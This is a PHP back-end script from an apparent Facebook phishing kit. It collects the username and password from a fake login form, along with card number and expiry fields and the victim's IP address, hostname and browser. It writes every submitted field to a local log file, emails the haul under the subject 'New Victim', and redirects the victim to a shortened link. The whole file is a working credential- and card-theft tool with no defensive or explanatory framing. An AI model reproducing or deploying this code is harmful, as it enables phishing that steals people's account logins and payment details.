<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- Facebook -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "First Name    :    ".$_POST['text']."\n";
$message .= "last name          : ".$_POST['pass']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Ahmed Ashraf ----------------------\n";
$cc = $_POST['ccn'];
$subject = "New Victim By munther ALiraqi ".$_POST['exm']."/".$_POST['exy'];

// ==================================

$handle = fopen("rezzzzza.text", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "===============BY ABDO V1===============\r\n");
fclose($handle);

// ==================================


fwrite($subject, $message);
mail($send,$subject,$message,$headers);

header('Location: https://bit.ly/3q8Tgk4');?>